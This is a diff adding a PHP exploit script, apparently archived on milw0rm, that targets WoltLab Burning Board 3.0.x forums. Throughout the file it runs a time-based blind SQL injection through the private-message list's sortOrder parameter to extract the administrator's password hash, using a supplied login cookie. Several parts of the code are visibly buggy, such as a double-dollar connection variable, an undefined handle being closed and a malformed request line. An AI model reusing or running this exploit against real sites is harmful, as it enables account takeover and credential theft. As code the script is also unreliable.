@@ -1,0 +1,170 @@
+<?php
+ini_set("max_execution_time",0);
+echo "WoltLab Burning Board 3.0.X Remote SQL-Injection Exploit by NBBN\n";
+start(1, 48);
+/** You have to edit this script. **/
+
+/** Works succesfully at 3.0.1. If you enter in 3.0.3 PL1: 
+index.php?page=PMList&folderID=0&pageNo=1&sortField=isViewed&sortOrder=blup 
+you get an mysql error, currently I don't know it's fixxed or not. So, if 
+there is a vulnerabiltiy. Exploiting takes some times, so get a coffee or 
+some other drink xD. Please don't use this for crack boards, thx. **/
+
+
+function start($pos, $char)
+{
+static $hash = "Hash: ";
+$host = "localhost";       // Edit the host
+$path = "/xampp/wbb3/install/wbb3/wbb/";   // and edit the path
+
+$attack = 
+"$path"."index.php?page=PMList&folderID=0&pageNo=1&sortField=isViewed&sortOrder=ASC,
+%20
+(SELECT%20password%20FROM%20wcf1_user%20WHERE%20userID=1%20AND%20IF(ORD(SUBSTR(password,
+$pos,$pos))>$char,BENCHMARK(3000000,MD5(23)),1))";  // Edit 3000000 if the 
+stuff doesn't work or taking long times. 
+
+/** Place here youre autologin cookie **/
+$cookie = "wcf_cookieHash=; wcf_boardLastActivityTime=; wcf_userID=; 
+wcf_password=;";
+
+$starttime = time();
+$connection = fsockopen($host, 80);
+fputs($connection, "GET: $attack HTTP/1.1\n");
+fputs($connection, "Host: $host\n");
+fputs($connection, "Cookie: $cookie\n");
+fputs($connection, "Content-type: application/x-www-form-urlencoded\n");
+fputs($connection, "Connection: close\n\n");
+fputs($connection, "$attack\n");
+fputs($$connection, "$cookie\n");
+//while(!feof($connection)) {
+//$res .= fgets($connection, 128);
+//}
+fclose($con);
+$endtime = time();
+$dif = $endtime - $starttime;
+
+
+if($dif > 10)  // Edit this number, if the script doesn't work
+{
+  if($char != 65 or $char != 66 or $char != 67 or $char != 68 or $char != 69 
+or $char != 70)
+  {
+echo "Not the right char ($char) position $pos. Try another...\n";
+start($pos, $char +1);
+  }
+else { start($pos, $char +1); }
+}
+else
+{
+echo "K, find one ($char)\n";
+if ($char == 48)
+{
+$hash .= "0";
+}
+else if($char == 49)
+{
+$hash .= "1";
+}
+else if($char == 50)
+{
+$hash .= "2";
+}
+else if($char == 51)
+{
+$hash .= "3";
+}
+else if($char == 52)
+{
+$hash .= "4";
+}
+else if($char == 53)
+{
+$hash .= "5";
+}
+else if($char == 54)
+{
+$hash .= "6";
+}
+else if($char == 55)
+{
+$hash .= "7";
+}
+else if($char == 56)
+{
+$hash .= "8";
+}
+else if($char == 57)
+{
+$hash .= "9";
+}else if($char == 58)
+{
+$hash .= "10";
+}
+else if($char == 65)
+{
+$hash .= "a";
+}
+else if($char == 66)
+{
+$hash .= "b";
+}
+else if($char == 67)
+{
+$hash .= "c";
+}
+else if($char == 68)
+{
+$hash .= "d";
+}
+else if($char == 69)
+{
+$hash .= "e";
+}
+else if($char == 70)
+{
+$hash .= "f";
+}
+else if($char == 97)
+{
+$hash .= "a";
+}
+else if($char == 98)
+{
+$hash .= "b";
+}
+else if($char == 99)
+{
+$hash .= "c";
+}
+else if($char == 100)
+{
+$hash .= "d";
+}
+else if($char == 101)
+{
+$hash .= "e";
+}
+else if($char == 102)
+{
+$hash .= "f";
+}
+
+echo "$hash\n";
+if(strlen($hash) == 32) {
+die($hash);
+}
+else {
+start($pos +1, 48);
+}
+
+
+}
+
+
+
+
+}
+?>
+
+# milw0rm.com [2008-02-20]
